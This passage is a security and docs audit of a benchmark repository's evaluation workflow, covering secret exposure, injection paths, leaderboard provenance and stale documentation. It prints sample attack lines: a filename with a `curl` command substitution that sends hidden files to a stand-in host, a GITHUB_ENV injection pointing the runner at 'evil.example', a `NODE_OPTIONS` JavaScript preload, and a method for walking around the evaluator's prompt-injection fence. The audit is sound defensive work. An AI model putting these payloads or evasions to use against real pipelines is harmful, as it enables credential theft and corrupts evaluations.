  - *Evidence:* .github/workflows/evaluate-submission.yml:8 triggers on `pull_request_target` (trusted base-repo context, full secret access); :11-17 grants `contents: write` + `pull-requests: write` job-wide; :30-35 checks out the submitter's PR head. Submitter code then runs at four points, all before/alongside secret use: :46 `uv sync --extra providers` builds the local project using the PR's own `pyproject.toml`/`uv.lock` (a `[tool.hatch.build.hooks.custom]` hook or an added dependency is arbitrary code); :49 `uv run python scripts/validate_submissions.py` runs a script from the PR head; :79-85 `uv pip install -r "$dir/requirements.txt"` installs attacker-chosen packages (requirements.txt may carry `--index-url`, `git+https://`, or an sdist whose `setup.py` executes); :130-145 `uv run compactbench run` imports `method.py` via `importlib.util.spec_from_file_location` + `exec_module` (src/compactbench/runner/_resolver.py:42-50) into the same Python process. That process's env holds `COMPACTBENCH_GROQ_API_KEY` and `COMPACTBENCH_GOOGLE_AI_STUDIO_API_KEY` (:132-134), it can read `/tmp/hidden/ranked/*.yaml` (the path is passed as `--benchmarks-dir` on :138), and there is no egress restriction of any kind. No `timeout-minutes` on the job either.
  - *Why:* Concrete narrative: attacker opens a submission PR whose `method.py` is clean, readable, and passes review. The payload lives in `requirements.txt` as a dependency on an attacker-published sdist. Maintainer applies `evaluate`. Step :79 installs the sdist; its `setup.py` forks a background thread. Step :95 clones the hidden set. Step :130 runs. The background thread tars `/tmp/hidden/ranked/` plus `/tmp/hidden/.git/config` (which contains the PAT — see the next finding) and POSTs it to the attacker. Result: the entire hidden ranked set, its regeneration credential, and both maintainer provider keys, from one labelled PR — and the reviewed file never contained anything suspicious. `docs/architecture/decisions.md:203` states plainly that "This review is the security gate", which is precisely the assumption that fails: code review of `method.py` does not cover pyproject, uv.lock, requirements.txt, or transitive package code. Losing the hidden set is unrecoverable without regenerating every ranked template.
  - *Fix:* Split into two jobs. Job A `prepare` — no secrets, `permissions: {}` — checks out the PR head, verifies the PR touches nothing outside `submissions/<handle>/<method>/` (reject PRs modifying `src/`, `pyproject.toml`, `uv.lock`, `scripts/`, or `.github/`), and uploads just that directory as an artifact. Job B `evaluate` — `environment: evaluate` (secrets moved onto the environment with required reviewers), `permissions: contents: read`, `timeout-minutes: 30` — checks out `ref: ${{ github.event.pull_request.base.sha }}` so every line of runner, benchmark, and packaging code is trusted, downloads the artifact, and never runs `uv sync` against PR-head metadata. Execute the actual `compactbench run` inside a container with no default egress (`docker run --read-only --network cb-isolated -v /tmp/hidden:/hidden:ro`) whose only reachable host is a local provider relay that injects the real API keys, so `COMPACTBENCH_*_API_KEY` never enters the submitter's process. Move the results-commit step (:176-211) into a separate job that runs after the sandboxed one. Ban `requirements.txt` deps for v1 (`compactbench[providers]` only) or require `--require-hashes` + an allow-list.
- **[P0 · RISK · S]** HIDDEN_REPO_TOKEN is persisted in plaintext at /tmp/hidden/.git/config for submitter code to read
  - *Evidence:* .github/workflows/evaluate-submission.yml:104-106 runs `git clone --depth 1 "https://x-access-token:${HIDDEN_REPO_TOKEN}@github.com/compactbench/compactbench-hidden.git" /tmp/hidden`. git stores the remote URL verbatim, so `/tmp/hidden/.git/config` ends up containing `url = https://x-access-token:<PAT>@github.com/...`. The env-scoping at :97-98 (`env: HIDDEN_REPO_TOKEN:` on that step only) is therefore cosmetic — the credential outlives the step on disk. There is no cleanup step; `/tmp/hidden` persists for the rest of the job, including :130-145 where submitter `method.py` is imported and executed as the same user.
  - *Why:* This converts a one-shot hidden-set read into permanent, silent access. A submitter who reads one file (`open('/tmp/hidden/.git/config').read()`) can clone `compactbench-hidden` from their own machine indefinitely, including retired templates preserved for audit (docs/faq.md:63) and every future rotation, until someone notices and rotates the PAT. Rotating templates does not help if the attacker still holds the token. It is the highest-leverage single line in the whole repo.
  - *Fix:* Never put the credential in the URL. Use `git -c http.extraheader="AUTHORIZATION: basic $(printf 'x-access-token:%s' "$HIDDEN_REPO_TOKEN" | base64 -w0)" clone --depth 1 https://github.com/compactbench/compactbench-hidden.git /tmp/hidden` (extraheader passed via `-c` is not written to `.git/config`), then `rm -rf /tmp/hidden/.git` immediately afterwards. Even simpler: `gh api repos/compactbench/compactbench-hidden/tarball | tar xz` and never create a git dir at all. Also scope the PAT to Contents:Read on that one repo (as :93-94 claims) and verify that is actually true today, and rotate it now on the assumption that the current design has been reachable since April.
- **[P0 · RISK · L]** Nothing stops a submitter's method.py from reading and exfiltrating the hidden ranked set
  - *Evidence:* The compactor is loaded into the runner process by `exec_module` (src/compactbench/runner/_resolver.py:45-50), constructed at src/compactbench/runner/run.py:155 (`compactor = compactor_cls(counting_provider, args.model)`), and handed each hidden case's `Transcript` at src/compactbench/runner/cycle.py:79. Every hidden case is generated from `--benchmarks-dir /tmp/hidden/ranked` (.github/workflows/evaluate-submission.yml:138) — the location is passed on the command line, so no discovery is needed: `glob.glob('/tmp/hidden/ranked/**/*.yaml')` returns the raw templates including their `ground_truth` blocks (see the shape at benchmarks/public/elite_practice/buried_constraint_v1_1.yaml:37-44). There is no seccomp/network/filesystem confinement, no `--network none`, no egress allow-list, no self-hosted firewall (docs/architecture/decisions.md:189 explicitly dropped the firewalled runner and substituted the label review).
  - *Why:* The hidden ranked set *is* the benchmark's value proposition — docs/index.md:7 and docs/faq.md:33 sell it as the anti-overfitting guarantee. One accepted submission is enough to destroy it, and the theft is undetectable: it leaves no trace in `results.jsonl`, no anomalous score, no failed step. Any serious lab evaluating whether to submit will ask this question, and today the honest answer is "nothing stops it".
  - *Fix:* Run compaction in a network-isolated container (see the isolation design above) with the hidden templates mounted read-only and, better, not mounted at all — pre-generate the cases in a trusted job and hand the sandbox only the rendered `Transcript` JSON plus a callback for provider completions, keeping `ground_truth`/`evaluation_items` entirely outside the submitter's address space. Pair that with the honest interim measure: until the sandbox exists, state in docs/submitting.md and SECURITY.md that evaluation is maintainer-run under manual review with no technical containment, so submitters and readers are not misled by the current "hidden set keeps methods honest" framing.
- **[P0 · BUG · S]** GITHUB_ENV injection from submitter-controlled config.yaml `class_path`
  - *Evidence:* .github/workflows/evaluate-submission.yml:109-128 parses the submitter's `config.yaml` and writes `fp.write(f"CLASS_PATH={data['method']['class_path']}\n")` (plus PROVIDER/MODEL/DRIFT_CYCLES/CASE_COUNT) into `cfg.env`, then line 128 does `cat cfg.env >> "$GITHUB_ENV"`. No value is validated or escaped. A YAML block scalar in `submissions/<h>/<m>/config.yaml` such as `class_path: |` followed by `submissions/h/m/method.py:MyCompactor` and a second line `COMPACTBENCH_OLLAMA_BASE_URL=https://evil.example` writes both lines into `$GITHUB_ENV`, exporting an arbitrary variable into every subsequent step.
  - *Why:* Two immediate escalations. (1) `COMPACTBENCH_OLLAMA_BASE_URL=https://evil.example` combined with `runtime.provider: ollama` makes the *runner itself* POST every hidden transcript to the attacker — src/compactbench/providers/ollama.py:41-44 resolves the host straight from `os.environ` — a hidden-set exfiltration that requires no malicious code in `method.py` at all and survives any review of that file. Note this gets worse the moment PR #37 lands: `COMPACTBENCH_OPENAI_BASE_URL` becomes a second attacker-controllable egress endpoint in the evaluation path, so #37 must not be merged before this is fixed. (2) `NODE_OPTIONS=--require=/tmp/p.js` makes the three `actions/github-script` steps (:176, :213, :226) load attacker JavaScript into a Node process holding a GITHUB_TOKEN with `contents: write` + `pull-requests: write` on the base repo — push to main, rewrite `docs/data/leaderboard.json`, create releases.
  - *Fix:* Stop writing untrusted values to `$GITHUB_ENV`. Validate first and pass as step-scoped `env:` instead: in the Python block, assert `class_path` matches `^submissions/[a-z0-9][a-z0-9._-]{0,38}/[a-z0-9][a-z0-9._-]{0,38}/method\.py:[A-Za-z_][A-Za-z0-9_]*$` and that its directory equals the resolved submission dir; assert `provider` is in an explicit allow-list (`{anthropic, openai, groq, google-ai-studio}` — never `ollama` in CI); assert `model` matches `^[A-Za-z0-9._:/-]{1,80}$`; coerce `drift_cycles`/`case_count` with `int()` and range-check them. Write the validated values to `$GITHUB_OUTPUT` as individual keys, and reject anything containing a newline. Also change `python -c` at :114 to `uv run python` — it currently depends on the runner image happening to ship `python` with PyYAML, while the project's own YAML dep is ruamel.
- **[P0 · RISK · M]** Provider API keys are handed to the submitter's own process
  - *Evidence:* .github/workflows/evaluate-submission.yml:132-134 sets `COMPACTBENCH_GROQ_API_KEY` and `COMPACTBENCH_GOOGLE_AI_STUDIO_API_KEY` as env on the exact step that imports and executes `method.py`. src/compactbench/providers/groq.py:40-46 reads the key from `os.environ` and stores it on `self._client`, and the compactor is given that provider object directly (src/compactbench/runner/run.py:155, src/compactbench/compactors/base.py:23-25) — so even if the env were scrubbed, `self.provider._client.api_key` is one attribute away.
  - *Why:* Every evaluated submission gets the maintainer's provider credentials. Consequences run from quiet billing abuse (the keys are for paid accounts — docs/getting-started.md:41 notes the free tier can't complete a real run) to using CompactBench's keys to attack the providers' ToS. It also silently invalidates comparability: a method could bill unlimited extra calls against the maintainer key while reporting whatever `TokenUsage` it likes.
  - *Fix:* Terminate provider calls outside the sandbox. Run a small local relay in the trusted job that exposes an OpenAI-compatible endpoint on the sandbox network, injects the real key server-side, enforces a per-run call/token budget, and logs every request (which also gives you an independent, tamper-proof `TokenUsage` for the leaderboard instead of trusting the counting provider inside the submitter's process). Issue the sandbox a per-run bearer token with a hard spend cap. Until then, at minimum use dedicated evaluation-only keys with the lowest possible rate/spend limits and rotate them on a schedule.
- **[P0 · RISK · M]** Leaderboard ranks whatever results.jsonl a submitter committed — no provenance binding
  - *Evidence:* scripts/rebuild_leaderboard.py:54-120 reads `submissions/*/*/results.jsonl` off the merged tree and ranks it. `qualify()` (src/compactbench/leaderboard/qualification.py:25-74) checks only compression floor, contradiction rate, cycle count, and per-family means — it never checks `suite_key`/`suite_version`, never checks who produced the file, and there is no signature, attestation, or run-id registry. `project_row` (src/compactbench/leaderboard/projection.py:61-79) copies `benchmark_version = f"{run_result.suite_key}@{run_result.suite_version}"`, `target_provider`, `target_model`, and `method_name` straight out of the submitter's file. The only intended defence is the "Commit canonical hidden-run results" step (.github/workflows/evaluate-submission.yml:176-211) — which is `if: github.event.pull_request.head.repo.full_name == github.repository`, i.e. **skipped for every fork PR**, which is where all outside submissions come from (:213-224 just prints a warning telling a human to remember).
  - *Why:* The board is empty today, so the *first* entries define its credibility permanently. A submitter can run against the public `elite_practice` set (or `--provider mock`), hand-edit `overall_score` to 0.98 and `suite_key` to `elite_v1`, and merge — and the published numbers will say "hidden ranked set". Given the workflow has never actually run (finding 1), a maintainer under pressure to answer issue #38 is *exactly* the person who might merge a submitter-supplied results file. Wrong published numbers are worse for a benchmark than no published numbers.
  - *Fix:* Make submitter-supplied `results.jsonl` unusable: add `.gitattributes`/CI rejection of any `submissions/**/results.jsonl` in a PR diff, and have the evaluation job publish results to a maintainer-controlled location instead (a `results/` branch, a GitHub release asset, or a signed file committed by a separate trusted job that also stamps `run_id`, the head SHA it evaluated, and an HMAC over the payload using a maintainer secret). Add a `verify_results_provenance()` gate in scripts/rebuild_leaderboard.py that requires the HMAC and `suite_key == 'elite_v1'` before `qualify()` is even called, and make it fail the workflow rather than warn. Fix the fork branch (:177) — use the artifact + a trusted follow-up job, since "maintainer must remember to download an artifact" is not a control.
- **[P1 · BUG · S]** Script injection into actions/github-script via the score summary
  - *Evidence:* .github/workflows/evaluate-submission.yml:147-161 pipes `compactbench score` output into a `body<<EOF` heredoc on `$GITHUB_OUTPUT`, then :226-235 interpolates it into JavaScript source: ``body: `${{ steps.summary.outputs.body }}` ``. The summary contains submitter-controlled strings: src/compactbench/cli.py:265 prints `run_result.method_name` and `method_version`, which come straight from the submitter's class attributes (`method_name=compactor_cls.name` at src/compactbench/runner/run.py:103-104). `${{ }}` is textual substitution performed before the script is parsed, so a backtick or `${...}` in `MyCompactor.name` lands inside a JS template literal.
  - *Why:* The github-script step runs Node with a GITHUB_TOKEN carrying the job's `contents: write` and `pull-requests: write`. Successful injection means pushing to main or rewriting the leaderboard. Rich's table borders and 80-column wrapping mangle some payloads today, but that is an accident of rendering, not a security control, and the same untrusted string also reaches an `EOF`-delimited heredoc where a crafted line can define arbitrary step outputs.
  - *Fix:* Never interpolate `${{ }}` inside a `script:` block. Pass through env and read it in JS: add `env: { SUMMARY: ${{ steps.summary.outputs.body }} }` — or better, have the step read `summary.txt` from disk: `const body = fs.readFileSync('summary.txt','utf8')` and build the comment with `'## Automated evaluation result\n\n```\n' + body + '\n```'`. Use a random heredoc delimiter (`DELIM=$(openssl rand -hex 16)`) if you keep the `$GITHUB_OUTPUT` path at all. Independently, validate `method_name`/`method_version` at load time in src/compactbench/runner/_resolver.py against `^[a-z0-9][a-z0-9._-]{0,63}$` / a semver pattern so the untrusted string never gets long or exotic in the first place.
- **[P1 · BUG · S]** Shell command substitution via the resolved submission directory
  - *Evidence:* .github/workflows/evaluate-submission.yml:76 writes `submission_dir=$changed_dirs` to `$GITHUB_OUTPUT` where the value is a path taken from the PR's own file list, and :81 interpolates it into a `run:` block as `dir="${{ steps.submission.outputs.submission_dir }}"`. `${{ }}` substitution happens before bash parses the line, so a path the submitter chose — git permits `$`, backticks and parentheses in filenames — such as `submissions/a$(curl -sd @/tmp/hidden/ranked/x.yaml https://evil)/m/method.py` becomes live command substitution inside the double quotes. The same value is reused at :84 and :112.
  - *Why:* It is a second, independent RCE-with-secrets path that does not require the submitter to ship any Python at all, and it fires at :79-85 — before the hidden clone, so it can plant a watcher that captures the token when the clone happens. It is currently masked only by finding 1 keeping the workflow from running at all.
  - *Fix:* Move untrusted values out of `run:` interpolation entirely: `env: SUBMISSION_DIR: ${{ steps.submission.outputs.submission_dir }}` and use `"$SUBMISSION_DIR"` in the script (the workflow already does this correctly at :111-112, so just apply the same pattern at :80-85). Also enforce the path shape in the resolve step — reject anything not matching `^submissions/[a-z0-9][a-z0-9._-]{0,38}/[a-z0-9][a-z0-9._-]{0,38}$` — which additionally normalises handles for attribution.
- **[P1 · RISK · M]** The `evaluate` label authorizes a PR, not a reviewed commit
  - *Evidence:* .github/workflows/evaluate-submission.yml:8-9 fires on `pull_request_target: types: [labeled]` and :25 gates on `github.event.label.name == 'evaluate'`. The checked-out SHA (:34) is the head at label time. Nothing records which SHA the maintainer actually reviewed, and nothing prevents re-triggering: removing and re-adding the label re-runs against whatever the head is then. There is no `environment:` block on the job, so there is no per-run approval either. docs/architecture/decisions.md:203 names this review "the security gate"; docs/submitting.md:54 additionally documents a `reevaluate` label that the workflow does not implement at all.
  - *Why:* The classic bypass is trivial: submit clean code, wait for review, push the payload, then ask a maintainer to label (or wait for the label that was already queued). The gate protects against drive-by runs but not against the attacker it is actually meant to stop, and the documented re-evaluation flow silently does nothing, so maintainers will fall back to toggling `evaluate` — which is exactly the un-reviewed re-run path.
  - *Fix:* Replace the label gate with a GitHub deployment `environment: evaluate` carrying required reviewers — approval is then per workflow *run*, and secrets move onto the environment (see next finding). Keep the label as the trigger, but have the prepare job post the head SHA it is about to evaluate and fail if it differs from a `evaluated-sha:<sha>` marker the maintainer supplies (or simply fail when new commits arrived after the label event: compare `github.event.pull_request.head.sha` to the SHA at approval time). Either implement `reevaluate` in the `if:` at :25 or delete the claim from docs/submitting.md:54.
- **[P1 · RISK · S]** Secrets are repo-scoped, not environment-scoped — contradicting the documented model
  - *Evidence:* The evaluate job (.github/workflows/evaluate-submission.yml:24-29) declares no `environment:`, so `secrets.HIDDEN_REPO_TOKEN`, `secrets.GROQ_API_KEY`, and `secrets.GOOGLE_AI_STUDIO_API_KEY` are ordinary repository secrets, readable by any workflow running in a trusted context. docs/architecture/decisions.md:204 asserts the opposite: "stored as repo secrets scoped to the `evaluate-submission.yml` workflow environment. They are not accessible to regular `pull_request` events or to other workflows." The same section is stale in two other ways: :197 says the hidden repo is cloned "using a deploy key", but :104-106 uses a PAT; docs/submitting.md:10 says "self-hosted runner", but :26 is `runs-on: ubuntu-latest`.
  - *Why:* The stated control does not exist, so the threat model in the architecture doc is describing a system that was never built. Any new workflow a maintainer adds (or any workflow file merged in a PR that also touches something else) inherits access to the hidden-set credential. And with the docs wrong, the next maintainer — the user taking over now — will reason from a false baseline.
  - *Fix:* Create a GitHub environment named `evaluate` with required reviewers and move all three secrets onto it; add `environment: evaluate` to the job at :24. That single change simultaneously delivers per-run approval (previous finding) and real scoping. Then correct docs/architecture/decisions.md:196-204 to describe the PAT, the GitHub-hosted runner, and the actual isolation posture, and correct docs/submitting.md:10.
- **[P1 · RISK · M]** Submitter dependencies install with no pinning, no hashes, and no index restriction
  - *Evidence:* .github/workflows/evaluate-submission.yml:79-85 runs `uv pip install -r "$dir/requirements.txt"` on a fully submitter-controlled file. requirements files may carry `--index-url` / `--extra-index-url` / `--find-links`, direct `git+https://` refs, and sdists whose `setup.py` runs at install time; nothing here passes `--require-hashes`, `--no-index`, or an allow-list. Line 46's `uv sync --extra providers` has no `--frozen` or `--locked`, so it resolves against the PR's own `pyproject.toml`/`uv.lock` and builds the project through the PR's `[build-system]`. submissions/_template/requirements.txt:1-3 only *asks* for pins in a comment, and docs/submitting.md:37 only *states* the requirement — scripts/validate_submissions.py:16-32 checks for `FILL_ME` strings and nothing else. The submitter-facing rule is therefore unenforced.
  - *Why:* It is the cheapest way to get code into the secret-bearing job while keeping `method.py` clean enough to pass review, and it also breaks reproducibility: two runs of the same submission can install different code, so "the same method" can score differently and nobody can reconstruct which dependency tree produced a published number.
  - *Fix:* For v1, disallow `requirements.txt` entirely — evaluate against `compactbench[providers]` only, and delete the file from submissions/_template/ so the expectation is clear. If you keep it: extend scripts/validate_submissions.py with a `check_requirements()` that rejects any line containing `--index-url`, `--extra-index-url`, `--find-links`, `-e`, `git+`, `http://`, `https://`, or a non-`==` specifier, and require a `--hash=sha256:` on every line; install with `uv pip install --require-hashes --no-deps -r`. Add `--locked` to `uv sync` at :46 (and in ci.yml:27/61) so the lockfile is verified rather than silently re-resolved, and set `enable-cache: false` on setup-uv in the evaluate job so a run that installed attacker packages never writes a shared cache entry.
- **[P1 · GAP · M]** Prompt-injection fence is a single literal string replacement and is easy to walk around
  - *Evidence:* src/compactbench/runner/evaluation.py:59-73 builds the evaluator prompt: `sanitized = context.replace("</untrusted_artifact>", "</untrusted_artifact_REDACTED>")` wrapped in fixed `<untrusted_artifact>` tags. The defence is one case-sensitive literal replace. It does not touch the opening tag, so an artifact containing `<untrusted_artifact>` starts a nested block; it does not handle case variants (`</UNTRUSTED_ARTIFACT>`), whitespace inside the tag (`</untrusted_artifact >`), or entity/unicode lookalikes; and the delimiter is a fixed, publicly documented string that every submitter can read in this file. tests/unit/test_runner_evaluation.py:130-142 covers exactly the one literal case. The prompt text itself (:64-69) even enumerates the injection phrases it defends against, which is a useful hint to an attacker tuning around it.
  - *Why:* The artifact is attacker-influenced by construction (it is the method's output) and it is the *entire* context the evaluator sees. A method that can make the evaluator answer "correctly" without actually preserving state scores well while measuring nothing — the benchmark silently stops measuring compaction. This is more likely to arrive as accidental over-optimisation than as deliberate cheating, which makes it harder to catch by review.
  - *Fix:* Use a per-call random nonce as the delimiter: generate `nonce = secrets.token_hex(8)` per evaluation, fence with `<artifact-{nonce}>...</artifact-{nonce}>`, and strip any occurrence of `{nonce}` from the artifact text before embedding (an attacker cannot guess it). Do the containment check with a case-insensitive regex over `</?\s*untrusted_artifact[^>]*>` rather than `str.replace`. Add a detection metric rather than relying on prevention alone: score `evaluator_influence` by re-running a sample of items with a decoy question whose correct answer is not in the artifact, and disqualify runs whose artifact text contains imperative second-person directives (cheap classifier or keyword heuristic) — surface it in `qualify()` alongside the contradiction-rate floor. Extend tests/unit/test_runner_evaluation.py with the case/whitespace/opening-tag variants.
- **[P1 · GAP · M]** Hidden-set metadata leaks into the public PR comment and into merged results.jsonl
  - *Evidence:* `case_id` is built as `f"{template.key}:s{seed}:d{difficulty.value}"` (src/compactbench/engine/generation.py:47). src/compactbench/cli.py:274-285 prints every `case.case_id` in the score table, and .github/workflows/evaluate-submission.yml:150-161/226-235 posts that table verbatim as a public PR comment. `results.jsonl` additionally records `template_key` per case and `item_key`/`item_type` per item (src/compactbench/contracts/result.py:56-60, 94-95) and is uploaded as a workflow artifact (:163-167, publicly downloadable on a public repo) and committed into the repo (:176-211) where `rebuild_leaderboard.py` reads it. `ItemScore.details` is always `{}` (src/compactbench/scoring/scorer.py:42), so no transcripts or model responses leak — the leak is structural metadata only.
  - *Why:* Every evaluation permanently publishes the exact names of hidden templates, the seeds used, the difficulty, and the per-item type/weight structure. Across a handful of submissions that enumerates the hidden pool: how many templates per family, their naming/versioning scheme, and which seeds recur — enough to tell a submitter when a template rotates and to target overfitting at families rather than at the benchmark. It also undercuts docs/submitting.md:50 ("The hidden test content itself is never published"), which readers will reasonably interpret as covering this.
  - *Fix:* Add a redaction mode: `compactbench score --results ... --public` that replaces `case_id`/`template_key` with a stable salted hash (`hmac(salt, template_key)[:8]`) and drops the per-case table entirely, aggregating to family level only; use that flag at .github/workflows/evaluate-submission.yml:150. In the runner, write hidden runs with hashed `case_id`/`template_key` (keep the mapping in the hidden repo for audit) so the committed `results.jsonl` never carries real keys — `_infer_family` in src/compactbench/leaderboard/qualification.py:81 needs a family field carried separately, which is a small contract addition. Then make docs/submitting.md:50 say precisely what is and is not published.
- **[P2 · RISK · S]** No job timeout and no permissions floor on the workflows
  - *Evidence:* No workflow in .github/workflows/ sets `timeout-minutes` on any job (grep returns nothing), so the evaluate job — which executes submitter code — can run to GitHub's 6-hour ceiling. .github/workflows/ci.yml has no `permissions:` block at all, so its five jobs inherit the repository default token permissions (read-write unless the org default has been changed). evaluate-submission.yml:11-17 grants `contents: write` + `pull-requests: write` to the whole job, including the steps that execute submitter code, rather than only to the steps that need it.
  - *Why:* A hung or deliberately abusive submission burns queue time and Actions capacity (docs/architecture/decisions.md:212 budgets on "free minutes"), and cryptomining in a labelled PR is a real pattern for public repos. The over-broad `contents: write` is what makes the github-script injection above worth exploiting; without it that step could only comment.
  - *Fix:* Add `timeout-minutes: 30` to the evaluate job and `timeout-minutes: 20` to CI jobs. Add `permissions: contents: read` at the top of ci.yml (jobs there need nothing more). In evaluate-submission.yml, set job-level `permissions: contents: read` and grant `pull-requests: write` only on the comment step via a separate job, moving the results commit into its own trusted job that never runs submitter code.
- **[P2 · STALE · S]** SECURITY.md describes controls that do not exist and excludes the ones that matter
  - *Evidence:* SECURITY.md:29 lists as out of scope "Denial-of-service via oversized submissions — the runner enforces rate and size limits". No such limits exist: there is no size check in scripts/validate_submissions.py, no `timeout-minutes` in any workflow, no cap on transcript or artifact size in src/compactbench/runner/. SECURITY.md:24 does correctly scope in "Any leak vector that lets a submitter view hidden ranked templates" — which is exactly what findings 2-5 describe, meaning the project's own policy classifies its current pipeline as vulnerable. SECURITY.md:31 puts dependency vulnerabilities out of scope and defers to Dependabot, while six Dependabot PRs (#31-#36, oldest May 2026) sit unmerged.
  - *Why:* A researcher reading SECURITY.md is told a control exists that does not, and is told dependencies are handled by a process that has been stalled for three months. For a project actively soliciting outside code execution, the security policy is part of the trust surface.
  - *Fix:* Delete the false claim at SECURITY.md:29 (or implement it: size cap in validate_submissions.py plus `timeout-minutes`). Add a short "Evaluation pipeline threat model" section stating plainly what containment exists today, so submitters and researchers are not surprised. Change :31 to say Dependabot PRs are merged weekly and then actually merge #31-#36 — a benchmark whose CI runs four-month-old `cryptography` and `urllib3` while asking people to trust its runner is a bad look independent of exploitability.
- **[P2 · STALE · S]** CODEOWNERS points at a placeholder handle, silently disabling code-owner review
  - *Evidence:* .github/CODEOWNERS:5-10 assigns every path — including `/src/compactbench/scoring/`, `/src/compactbench/leaderboard/`, and `/benchmarks/` — to `@UsernameLoad`, with the header comment at :3 saying "adjust when maintainers beyond the initial author join". GitHub silently ignores CODEOWNERS entries naming a user who is not a collaborator with write access, and an unparseable/unknown owner disables the rule rather than failing closed.
  - *Why:* If that handle is not the account taking over the project, "require review from Code Owners" branch protection is inert on precisely the files that determine published scores — the scoring formulas, the qualification floors, and the leaderboard projection. A change to `elite_score()` weights could then land without the review the repo believes it requires. With a lead-developer handover happening now, this is exactly the moment it will be wrong.
  - *Fix:* Replace `@UsernameLoad` with the real maintainer handle (or a `@compactbench/maintainers` team, which docs/architecture/decisions.md:216 already assumes exists), and verify GitHub accepts it — the repo's Settings → Branches page flags unknown owners. Add `/.github/workflows/` and `/scripts/` to the owned paths: workflow files are the highest-privilege code in the repo and are currently only covered by the `*` catch-all.
- **[P2 · GAP · M]** No dependency-vulnerability scanning and no reproducible dependency floor
  - *Evidence:* All runtime dependencies in pyproject.toml:34-43 are lower-bound only (`typer>=0.12`, `pydantic>=2.7`, `httpx>=0.27`, …), as are the provider extras at :46-52. .github/workflows/ci.yml runs ruff, pyright, pytest, and a notebook smoke test — no `pip-audit`, no `uv pip audit`, no OSV scan, and no `--locked`/`--frozen` on any `uv sync`. codeql.yml analyses first-party Python only. `uv.lock` exists and is committed but nothing in CI verifies a resolution matches it.
  - *Why:* The published wheel is what users `pip install` to reproduce leaderboard numbers; with unbounded upper ranges, two people running "the same" version get different dependency trees and can get different `tiktoken` tokenization, which directly changes `compression_ratio` (docs/methodology.md:76-79 pins the tokenizer by name but not by version). That makes it a scoring-integrity issue, not just a hygiene one. And there is currently no automated signal at all when a shipped dependency has a known CVE.
  - *Fix:* Add a `security` job to ci.yml running `uv run pip-audit --strict` (or `osv-scanner`) on the locked set, scheduled weekly alongside codeql. Add `--locked` to every `uv sync` in ci.yml (:27, :61, :85) and in docs.yml/update-leaderboard.yml so the committed lock is authoritative. Pin `tiktoken` with an upper bound (`tiktoken>=0.7,<1`) and record the resolved `tiktoken` version in the `run_start` event in src/compactbench/runner/persistence.py:29-45 so published compression ratios are attributable to a specific tokenizer build.

### Docs & onboarding

*What a newcomer actually hits — 22 findings*

The docs are well-written prose sitting on top of software they no longer describe. Three of the commands shown in README/getting-started fail outright against the current CLI (verified by running them), the README's flagship "write your own compactor" example crashes with a TypeError, and the `.env` setup instruction does not work for any provider because every provider reads `os.environ` directly while the `.env` file is only parsed into a `Settings` object nothing imports. Worse for adoption: PyPI 0.1.0 was published 2026-04-17T22:29Z, but PRs #22-#28 landed 2026-04-18/19 — so `--estimate`, `--concurrency`, prompt caching, the `reference_resolution` family, and the TokenUsage table are all documented on the live site and absent from the only installable release, while CHANGELOG's `[Unreleased]` is empty. Layered on top is the credibility gap that produced issue #38: there are zero published numbers anywhere in the docs (grep confirms), no interpretation guide, and the only contributor onramp in CONTRIBUTING.md points at three closed issues.

- **[P0 · STALE · M]** Every post-launch feature is documented on the live site but absent from the only installable release
  - *Evidence:* GitHub release v0.1.0 published 2026-04-17T22:29:33Z (mcp github list_releases) is the only release. `git log --format="%h %ad"` shows #22 (case parallelism + `--estimate`), #23 (prompt caching), #26, #27 (reference_resolution family + per-item-type breakdown), #28 (TokenUsage telemetry) all landed 2026-04-18/19 — after that release. docs.yml:4-6 deploys the site from `main` on every push, so compactbench.github.io documents all of it: docs/getting-started.md:43-51 (prompt caching, `--estimate`), src/compactbench/cli.py:81-92 (`--estimate`), cli.py:73-80 (`--concurrency`). CHANGELOG.md:8 `## [Unreleased]` is EMPTY with nothing recorded since 0.1.0. A user doing `pip install compactbench` (README.md:29) gets 0.1.0: no `--estimate`, no `reference_resolution` templates, no token table.
  - *Why:* The docs site is a promise the package cannot keep. Anyone arriving from the docs and running `pip install compactbench` then `compactbench run --estimate` gets an unknown-option error. The Colab notebook makes it worse: notebooks/try_compactbench.ipynb cell 2 runs `!pip install -q 'compactbench[providers]'`, so the zero-install onramp installs 4-month-old code while the docs describe main. With outside interest arriving right now (#37, #38), this is the fastest way to look abandoned.
  - *Fix:* Cut 0.2.0 immediately. (1) Populate CHANGELOG.md `[Unreleased]` from PRs #12-#28 and promote it to a `## [0.2.0] — 2026-08-xx` heading; (2) bump `version` in pyproject.toml:3; (3) tag and run the existing .github/workflows/release.yml. Until that ships, add a one-line admonition at the top of docs/getting-started.md stating which features require installing from git. Longer term: make docs.yml deploy a versioned site (mike) so `latest` matches PyPI.
- **[P0 · BUG · S]** README's "Writing your own compactor" example crashes with TypeError
  - *Evidence:* README.md:65 shows `async def compact(self, transcript: Transcript, config: dict) -> CompactionArtifact:` — two parameters. src/compactbench/runner/cycle.py:79 calls `await compactor.compact(working_transcript, previous_artifact=...)`. I wrote a compactor with exactly the README signature and ran it: `TypeError: MyCompactor.compact() got an unexpected keyword argument 'previous_artifact'`, surfaced as an unhandled Rich traceback, not a friendly error. src/compactbench/compactors/base.py:28-33 and docs/writing-a-compactor.md:22-27 both show the correct 3-arg signature; only the README is wrong.
  - *Why:* This is the single most-copied code block in the project — it is the README section that converts a reader into a contributor, and it is the exact path a would-be leaderboard submitter takes. It fails on first run with a stack trace, which reads as "this project is broken" rather than "the doc is stale."
  - *Fix:* Fix README.md:65 to match base.py:28-33 (`config: dict[str, Any] | None = None, previous_artifact: CompactionArtifact | None = None`), and add the sentence from notebook cell 13 that the class is constructed with `provider` and `model` so `self.provider.complete(...)` is available — docs/writing-a-compactor.md never says this either, leaving "how do I call an LLM from my compactor?" unanswered outside the notebook and submissions/_template/method.py:43. Separately, wrap the `compact()` call in runner/cycle.py:79 so a signature mismatch raises a `MethodResolutionError` naming the required signature instead of a traceback.
- **[P0 · GAP · M]** Nothing in the docs tells a newcomer what a good score is — no baselines, no reference numbers, no interpretation guide
  - *Evidence:* docs/data/leaderboard.json is `{"entries": []}` with `updated_at: 2026-04-17`. Grepping docs/ and README.md for any published figure (`baseline score|reference score|expect(ed) score|scores? (of|around) 0\.`) returns zero hits. docs/methodology.md defines every formula (lines 42-101) but never states an achievable range. docs/leaderboard.md:33 renders "Updated 2026-04-17 … · 0 entries" to every visitor. Issue #38 (2026-08-23, alexander-potemkin) is exactly this: "not a single run result - why is that? What to compare with?"
